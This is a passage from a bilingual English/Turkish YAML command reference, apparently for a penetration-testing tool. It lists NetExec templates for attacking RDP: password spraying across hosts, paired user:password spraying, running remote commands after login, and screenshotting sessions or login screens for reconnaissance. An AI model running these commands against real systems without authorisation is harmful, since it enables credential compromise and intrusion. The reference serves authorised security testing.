        mümkün olduğunda (Pwn3d!) görüntülenir.
    command: "nxc rdp {{target}} -u {{username}} -p {{password}}"

  - title:
      en: nxc rdp - password spray
      tr: nxc rdp - parola püskürtme
    desc:
      en: |
        Password spray against RDP services. Tests credentials against multiple
        RDP hosts. Watch for account lockouts!
      tr: |
        RDP hizmetlerine parola püskürtme yapar. Bilgiler birden çok RDP makinesinde sınanır. Hesap
        kilitlenmelerine dikkat edilir!
    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title:
      en: nxc rdp - password spray without bruteforce
      tr: nxc rdp - birebir eşleşmeli parola püskürtme
    desc:
      en: |
        Password spray with 1:1 user:password mapping. Each user gets matched
        with corresponding password from file. user1=>pass1, user2=>pass2.
      tr: |
        Birebir kullanıcı:parola eşleşmeli parola püskürtme yapar. Her kullanıcı dosyadaki karşılığıyla
        eşleşir: user1=>pass1, user2=>pass2.
    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"

  - title:
      en: nxc rdp - execute command
      tr: nxc rdp - uzaktan komut çalıştırma
    desc:
      en: |
        Execute command on remote system via RDP. Runs command through RDP
        session. Shows (Pwn3d!) on success.
      tr: |
        RDP üzerinden uzak sistemde komut çalıştırır. Komut RDP oturumu aracılığıyla koşulur. Başarıda
        (Pwn3d!) görüntülenir.
    command: "nxc rdp {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title:
      en: nxc rdp - take screenshot (connected)
      tr: nxc rdp - bağlı oturumun ekran görüntüsünü alma
    desc:
      en: |
        Take screenshot of RDP session when connected. Captures screen of active
        RDP session. Useful for reconnaissance.
      tr: |
        Bağlı RDP oturumunun ekran görüntüsünü alır. Etkin RDP oturumunun ekranı yakalanır. Keşif
        için işe yarar.
    command: "nxc rdp {{target}} -u {{username}} -p {{password}} --screenshot"

  - title:
      en: nxc rdp - take screenshot (without NLA, not connected)
      tr: nxc rdp - NLA olmadan giriş ekranını yakalama
    desc:
      en: |
        Take screenshot without NLA when not connected. Attempts to capture
        login screen on RDP servers with NLA disabled.
      tr: |
        NLA kapalıyken bağlı olmadan ekran görüntüsü alır. NLA devre dışı RDP sunucularında giriş
        ekranı yakalanmaya çalışılır.
    command: "nxc rdp {{target}} --screenshot-no-nla"

  # ============================================================================
  # FTP PROTOCOL
